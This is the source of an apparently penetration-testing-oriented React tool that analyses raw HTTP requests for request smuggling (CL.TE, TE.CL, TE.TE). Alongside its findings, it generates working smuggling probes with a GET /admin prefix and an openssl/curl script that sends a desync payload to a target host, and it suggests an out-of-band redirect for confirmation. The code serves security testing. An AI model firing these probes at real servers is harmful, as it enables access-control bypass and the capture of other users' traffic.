import { useMemo, useState } from 'react';
import { Callout, Card, KVTable, OutputBlock, SectionTitle, TextArea } from '@/components/ui';

type Sev = 'high' | 'medium' | 'low';

interface Finding {
  sev: Sev;
  title: string;
  detail: string;
}

interface Parsed {
  method: string;
  target: string;
  version: string;
  host: string;
  headers: Array<{ rawName: string; name: string; value: string }>;
  body: string;
  bodyBytes: number;
  clValues: number[];
  clRaw: string[];
  teValues: string[];
  teObfuscated: string[];
  dupHost: boolean;
  classification: string;
  findings: Finding[];
}

const SEV_COLOR: Record<Sev, string> = { high: 'var(--accent)', medium: 'var(--warn)', low: 'var(--info)' };
const SEV_LABEL: Record<Sev, string> = { high: 'HIGH', medium: 'MED', low: 'LOW' };

function parseRequest(raw: string): Parsed | null {
  const text = raw.replace(/\r\n/g, '\n');
  const lines = text.split('\n');
  const splitAt = lines.findIndex((l) => l.trim() === '');
  const headLines = splitAt === -1 ? lines : lines.slice(0, splitAt);
  const body = splitAt === -1 ? '' : lines.slice(splitAt + 1).join('\n');
  if (headLines.length === 0 || !headLines[0].trim()) return null;

  const [method = '', target = '', version = ''] = headLines[0].trim().split(/\s+/);
  const headers = headLines.slice(1).flatMap((l) => {
    const i = l.indexOf(':');
    if (i <= 0) return [];
    const rawName = l.slice(0, i);
    return [{ rawName, name: rawName.trim().toLowerCase(), value: l.slice(i + 1).trim() }];
  });

  const pick = (n: string) => headers.filter((h) => h.name === n);
  const clHeaders = pick('content-length');
  const teHeaders = pick('transfer-encoding');
  const hostHeaders = pick('host');
  const clRaw = clHeaders.map((h) => h.value);
  const clValues = clRaw.map((v) => (/^\d+$/.test(v.trim()) ? Number(v.trim()) : NaN));
  const teValues = teHeaders.map((h) => h.value);
  const teObfuscated = teValues.filter((v) => v.trim().toLowerCase() !== 'chunked');
  const host = hostHeaders[0]?.value ?? 'example.com';
  const bodyBytes = new TextEncoder().encode(body).length;

  const findings: Finding[] = [];
  if (clHeaders.length > 0 && teHeaders.length > 0) {
    findings.push({
      sev: 'high',
      title: 'Content-Length and Transfer-Encoding both present',
      detail:
        'RFC 7230 §3.3.3 requires the CL header to be removed when TE is present. A front-end that prefers CL and a back-end that prefers TE (or the reverse) disagree on the body boundary — a request smuggling primitive.',
    });
  }
  if (clHeaders.length > 1) {
    findings.push({
      sev: 'high',
      title: `Duplicate Content-Length (${clRaw.join(' / ')})`,
      detail: clValues.some((v) => Number.isNaN(v))
        ? 'A non-numeric duplicate is rejected by strict parsers and silently coerced by lenient ones — try the numeric and malformed pair together.'
        : clValues.every((v) => v === clValues[0])
          ? 'Identical duplicates are harmless on their own; the parser that keeps the last value is still worth fingerprinting with differing numbers.'
          : 'Differing values force each tier to pick a different body length — send a smuggled prefix after the shorter read.',
    });
  }
  if (teValues.length > 1) {
    findings.push({
      sev: 'high',
      title: `Duplicate Transfer-Encoding (${teValues.join(' / ')})`,
      detail:
        'Two TE headers, one of them obfuscated, makes one tier honour chunked encoding while the other falls back to Content-Length.',
    });
  }
  if (teObfuscated.length > 0 && teValues.length === 1) {
    findings.push({
      sev: 'medium',
      title: `Obfuscated Transfer-Encoding value "${teObfuscated[0]}"`,
      detail:
        'Variants such as xchunked, chunked\\t, "chunked, identity" or a space before the colon are parsed differently per tier. Compare the response of this request with a clean "chunked" control.',
    });
  }
  const declared = clValues.find((v) => !Number.isNaN(v));
  if (declared !== undefined && declared !== bodyBytes) {
    findings.push({
      sev: 'medium',
      title: `Declared ${declared} bytes, body is ${bodyBytes}`,
      detail:
        bodyBytes > declared
          ? 'The excess bytes are already a smuggling payload — the tier that stops at the declared length leaves the tail in the connection buffer.'
          : 'The body is shorter than declared, so the receiver blocks waiting for the remainder and may fold the next request into this one.',
    });
  }
  if (hostHeaders.length === 0) {
    findings.push({ sev: 'low', title: 'No Host header', detail: 'HTTP/1.1 requires Host. Some front-ends route by SNI instead, which allows a host-confusion test.' });
  } else if (hostHeaders.length > 1) {
    findings.push({ sev: 'medium', title: 'Duplicate Host header', detail: 'Routing and virtual-host selection may read different values on each tier — a cheap cache-poisoning and auth-bypass probe.' });
  }
  if (version && version !== 'HTTP/1.1') {
    findings.push({ sev: 'low', title: `Version ${version}`, detail: 'HTTP/1.0 has no chunked encoding, and HTTP/2 downgrades re-frame the body — both change which tier decides the boundary.' });
  }
  if (headers.some((h) => /[\s]$/.test(h.rawName))) {
    findings.push({
      sev: 'medium',
      title: 'Whitespace before a header colon',
      detail: 'A trailing space or tab in the header name makes strict parsers ignore the header while lenient ones honour it.',
    });
  }

  const conflicting = clHeaders.length > 0 && teHeaders.length > 0;
  const classification = conflicting
    ? teValues.length > 1 || teObfuscated.length > 0
      ? 'TE.TE'
      : 'CL.TE / TE.CL'
    : teValues.length > 1 || teObfuscated.length > 0
      ? 'TE.TE'
      : clHeaders.length > 1
        ? 'duplicate CL'
        : 'no boundary ambiguity';

  return {
    method: method || 'GET',
    target: target || '/',
    version: version || 'HTTP/1.1',
    host,
    headers,
    body,
    bodyBytes,
    clValues,
    clRaw,
    teValues,
    teObfuscated,
    dupHost: hostHeaders.length > 1,
    classification,
    findings,
  };
}

const CRLF = '\r\n';

export default function HttpSmugglingAnalyser() {
  const [raw, setRaw] = useState('');

  const req = useMemo(() => parseRequest(raw), [raw]);
  const host = req?.host ?? 'example.com';
  const target = req?.target ?? '/';

  const probes = useMemo(() => {
    const prefix = `GET /admin HTTP/1.1${CRLF}Host: ${host}${CRLF}${CRLF}`;
    return {
      clte: [
        `POST ${target} HTTP/1.1`,
        `Host: ${host}`,
        'Content-Length: 13',
        'Transfer-Encoding: chunked',
        '',
        '0',
        '',
        'SMUGGLED',
      ].join(CRLF),
      tecl: [
        `POST ${target} HTTP/1.1`,
        `Host: ${host}`,
        'Content-Length: 3',
        'Transfer-Encoding: chunked',
        '',
        '8',
        'SMUGGLED',
        '0',
        '',
        '',
      ].join(CRLF),
      tete: [
        `POST ${target} HTTP/1.1`,
        `Host: ${host}`,
        'Content-Length: 3',
        'Transfer-Encoding: chunked',
        'Transfer-Encoding: x',
        '',
        '8',
        'SMUGGLED',
        '0',
        '',
        '',
      ].join(CRLF),
      prefix,
    };
  }, [host, target]);

  const verification = `# 1. Baseline latency of a normal request
curl -s -o /dev/null -w 'baseline %{time_starttransfer}\\n' --http1.1 "https://${host}/"

# 2. Send the desync probe, then time the same request again
#    (paste the CL.TE or TE.CL block above into a raw socket, or use --data-binary with the exact bytes)
printf 'POST ${target} HTTP/1.1\\r\\nHost: ${host}\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' \\
  | openssl s_client -quiet -connect ${host}:443 -servername ${host} >/dev/null

curl -s -o /dev/null -w 'after    %{time_starttransfer}\\n' --http1.1 "https://${host}/"

# 3. Confirm the smuggled prefix landed: the next request should 400 or hang
curl -s -o /dev/null -w '%{http_code}\\n' --http1.1 "https://${host}/"`;

  return (
    <>
      <Card title="Raw HTTP request">
        <TextArea
          value={raw}
          onChange={setRaw}
          rows={12}
          mono
          label="Paste the request as sent on the wire"
          hint="Blank line separates the body; CRLF and LF are both accepted"
          placeholder={`POST /search HTTP/1.1\nHost: example.com\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG`}
        />
        {req && (
          <div className="mt-5">
            <KVTable
              rows={[
                ['Request line', <span className="rf-mono">{`${req.method} ${req.target} ${req.version}`}</span>],
                ['Host', <span className="rf-mono">{req.host}</span>],
                ['Content-Length', <span className="rf-mono">{req.clRaw.length ? req.clRaw.join(' / ') : 'absent'}</span>],
                ['Transfer-Encoding', <span className="rf-mono">{req.teValues.length ? req.teValues.join(' / ') : 'absent'}</span>],
                ['Body bytes', <span className="rf-mono">{`${req.bodyBytes} actual${req.clValues.find((v) => !Number.isNaN(v)) !== undefined ? ` · ${req.clValues.find((v) => !Number.isNaN(v))} declared` : ''}`}</span>],
                ['Classification', <span className="rf-mono" style={{ color: 'var(--accent)' }}>{req.classification}</span>],
              ]}
            />
          </div>
        )}
      </Card>

      {req && (
        <Card title={`Findings (${req.findings.length})`}>
          {req.findings.length === 0 ? (
            <Callout tone="ok" title="No CL/TE ambiguity in this request">
              Both headers are either absent or consistent. The desync may still live in the connection handling — send the
              probes below and compare responses across two consecutive requests on one keep-alive socket.
            </Callout>
          ) : (
            <div className="space-y-2">
              {req.findings.map((f) => (
                <div key={f.title} className="flex gap-2.5 rounded border border-[var(--card-border)] px-3 py-2">
                  <span
                    className="rf-mono h-fit rounded px-1.5 py-0.5 text-[10.5px] font-semibold"
                    style={{ color: SEV_COLOR[f.sev], background: 'var(--neutral-btn)' }}
                  >
                    {SEV_LABEL[f.sev]}
                  </span>
                  <div className="min-w-0">
                    <div className="text-[12.5px] font-medium text-[var(--text)]">{f.title}</div>
                    <div className="mt-0.5 text-[11.5px] leading-snug text-[var(--text-muted)]">{f.detail}</div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </Card>
      )}

      {req && (
        <Card title="Probe set">
          <SectionTitle>CL.TE — front-end reads Content-Length, back-end reads chunked</SectionTitle>
          <OutputBlock value={probes.clte} label="cl.te" rows={9} />
          <div className="mt-4">
            <SectionTitle>TE.CL — front-end reads chunked, back-end reads Content-Length</SectionTitle>
            <OutputBlock value={probes.tecl} label="te.cl" rows={10} />
          </div>
          <div className="mt-4">
            <SectionTitle>TE.TE — duplicated, obfuscated TE header</SectionTitle>
            <OutputBlock value={probes.tete} label="te.te" rows={11} />
          </div>
          <p className="mt-3 mb-0 text-[11.5px] leading-relaxed text-[var(--text-faint)]">
            Send each block on one keep-alive socket, then issue a benign request on the same socket. A 400, a hang, or a
            response that belongs to another user all indicate the prefix was accepted as the start of the next request.
          </p>
        </Card>
      )}

      <Card title="Verify and record">
        <OutputBlock value={verification} label="timing check" rows={12} />
        <div className="mt-4">
          <KVTable
            rows={[
              ['Tier fingerprint', 'Send TE: chunked + a body of 6 bytes; if the front-end 400s, it prefers CL. If it 200s, it prefers TE.'],
              ['Connection reuse', 'Both requests must travel the same TCP connection — disable connection pooling in the proxy.'],
              ['0.CL', 'Send Content-Length: 0 with a body of one pipelined request; only stacks that ignore CL on POST desync.'],
              ['Payload choice', 'A prefix of "GET /admin" only proves desync. Use a 302 to oast.example.com for blind confirmation.'],
              ['H2 downgrade', 'HTTP/2 to HTTP/1.1 translation re-frames the body — repeat with an h2 front-end and a CL header injected in the downgraded request.'],
              ['Record', 'Keep the raw request bytes, the socket transcript and the timing delta as evidence.'],
            ]}
          />
        </div>
        <div className="mt-4">
          <Callout tone="warn" title="Boundary is decided by the pair, not by the request">
            A single request proves nothing. The finding is only real when a benign request on the same connection returns
            the smuggled prefix&apos;s response. Log both requests with timestamps before reporting it.
          </Callout>
        </div>
      </Card>
    </>
  );
}
